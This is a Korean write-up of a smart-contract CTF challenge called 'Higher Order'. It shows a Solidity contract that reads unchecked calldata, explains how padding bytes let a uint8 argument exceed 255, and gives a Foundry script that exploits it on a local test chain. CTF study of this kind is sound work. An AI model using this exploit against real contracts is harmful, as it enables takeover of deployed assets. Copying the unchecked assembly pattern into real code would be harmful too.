# 지문

규칙이 깨지라고 존재하는 세상, 오직 교활하고 대담한 자만이 권력을 손에 쥘 수 있는 세상을 상상해보세요. 신비에 싸인 집단 **Higher Order**에 오신 걸 환영합니다. 이곳에는 보물이 숨겨져 있고, 한 명의 지휘관이 절대적인 권력을 휘두릅니다.

당신의 목표는 **Higher Order의 지휘관(Commander)** 이 되는 것입니다! 행운을 빕니다!

도움이 될 만한 것들:

* 때로는 calldata를 신뢰할 수 없습니다.
* 컴파일러는 끊임없이 진화하며 더 나은 우주선(spaceship)으로 발전하고 있습니다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

# 풀이 

calldata 구성을 생각해보면 아래와 같음.

`function selector` (4bytes) + `params` (`n`bytes)

근데 여기서 registerTreasury함수의 uint8 파라미터는 최대값이 255로 제한되지만, uint8 파라미터가 calldata layout상으로는 앞의 00 padding으로 32바이트가 된다는것을 주목해볼만함 

(여기서 중요한건 padding으로 끼워넣어지는 00은 다른값으로 바꿔도 문제가되지않음)

그 상태에서 calldataload(4)는 function selector 다음부터 32바이트를 가져오는 opcode.

그점을 유의해서 풀면됨.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}
contract SolveScript is Script {
    address public target = 0x3fA4E6e03Fbd434A577387924aF39efd3b4b50F2;

    function setUp() public {}

    // forge script -vvvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        (bool res, bytes memory resData) = target.call(abi.encodePacked(ITarget.registerTreasury.selector, uint256(type(uint256).max)));
        require(res);
        ITarget(target).claimLeadership();
        vm.stopBroadcast();
    }
}

```

